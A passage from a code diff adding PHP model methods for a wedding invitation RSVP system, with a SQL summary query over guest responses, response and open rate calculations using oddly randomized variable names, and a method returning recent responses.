+				COUNT(CASE WHEN source = 'invite' AND COALESCE(side, '') NOT IN ('groom', 'bride') AND status <> 'pending' THEN 1 END) AS inv_common_resp,
+				COALESCE(SUM(CASE WHEN source = 'invite' AND COALESCE(side, '') NOT IN ('groom', 'bride') AND status = 'yes' THEN guests END), 0) AS people_common,
+				COALESCE(SUM(CASE WHEN source = 'web' AND COALESCE(side, '') NOT IN ('groom', 'bride') AND status = 'yes' THEN guests END), 0) AS web_people_common
+			FROM invites")->row_array();
+$_v6ppysm = array_map('intval', $_v6ppysm);
+$_vkzdq6l = function ($_vzjknen, $_vfkauwu) { return $_vfkauwu > 0 ? (int) round($_vzjknen * 100 / $_vfkauwu) : 0; };
+$_v6ppysm['inv_responded'] = $_v6ppysm['inv_yes'] + $_v6ppysm['inv_no'];
+$_v6ppysm['response_rate'] = $_vkzdq6l($_v6ppysm['inv_responded'], $_v6ppysm['invited']);
+$_v6ppysm['open_rate'] = $_vkzdq6l($_v6ppysm['inv_opened'], $_v6ppysm['invited']);
+return $_v6ppysm;
+}
+public function recent_responses($_vegf8np = 8)
+{
+return $this->db->where('status <>', 'pending')->order_by('responded_at DESC, id DESC')->limit((int) $_vegf8np)->get('invites')->result_array();
+}
+}
